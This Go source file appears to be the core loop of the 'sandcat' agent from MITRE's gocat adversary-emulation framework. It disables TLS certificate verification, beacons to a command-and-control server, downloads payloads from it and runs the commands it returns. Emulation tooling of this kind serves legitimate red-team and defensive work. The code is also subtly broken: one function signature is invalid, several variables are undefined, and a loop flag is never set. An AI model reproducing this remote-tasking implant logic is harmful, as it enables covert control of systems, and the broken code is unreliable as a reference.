package core

import (
	"crypto/tls"
	"fmt"
	"github.com/mitre/gocat/contact"
	"net/http"
	"reflect"
	"time"

	"github.com/mitre/gocat/agent"
	"github.com/mitre/gocat/output"
	"github.com/mitre/gocat/util"
)

func initialize() (*agent.Agent{}) {
	output.SetVerbose(verbose)
	output.VerbosePrint("Started sandcat in verbose mode.")
	output.VerbosePrint(fmt.Sprintf("initial delay=%d", delay))
	output.VerbosePrint(fmt.Sprintf("beacon channel=%s", c2["c2Name"]))
	output.VerbosePrint(fmt.Sprintf("heartbeat channel=%s", c2["c2Name"]))

	// Initialize and run new agent.
	return &agent.Agent{}
}

//Core is the main function as wrapped by sandcat.go
func Core(server string, group string, delay int, c2 map[string]string, p2pReceiversOn bool, verbose bool) {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	sandcatAgent := initialize()
	sandcatAgent.Initialize(server, group, p2pReceiversOn)
	util.Sleep(float64(delay))
	sandcatAgent.Run(c2)
	sandcatAgent.Terminate()
}

// Establish contact with C2 and run instructions.
func (a *Agent) Run(c2Config map[string]string) {
	// Establish communication channels.
	comsChosen := false
	for !comsChosen {
		coms := contact.ChooseCommunicationChannel(a.GetFullProfile(), c2Config)
		if coms != nil {
			a.beaconContact = coms
			a.heartbeatContact = coms
		} else {
			util.Sleep(300)
		}
	}

	// Start main execution loop.
	watchdog := 0
	checkin := time.Now()
	for (util.EvaluateWatchdog(checkin, watchdog)) {
		// Send beacon and get response.
		beacon := a.Beacon()

		// Process beacon response.
		if len(beacon) != 0 {
			a.paw = beacon["paw"].(string)
			checkin = time.Now()

			// We have established comms. Run p2p receivers if allowed.
			// TODO
		}
		if beacon["instructions"] != nil && len(beacon["instructions"].([]interface{})) > 0 {
			// Run commands and send results.
			cmds := reflect.ValueOf(beacon["instructions"])
			for i := 0; i < cmds.Len(); i++ {
				cmd := cmds.Index(i).Elem().String()
				command := util.Unpack([]byte(cmd))
				output.VerbosePrint(fmt.Sprintf("[*] Running instruction %s", command["id"]))
				droppedPayloads := contact.DownloadPayloads(a.GetTrimmedProfile(), command["payloads"].([]interface{}), a.beaconContact)
				go a.runInstruction(command, droppedPayloads)
				util.Sleep(command["sleep"].(float64))
			}
		} else {
			if len(beacon) > 0 {
				util.Sleep(float64(beacon["sleep"].(int)))
				watchdog = beacon["watchdog"].(int)
			} else {
				util.Sleep(float64(15))
			}
		}
	}
}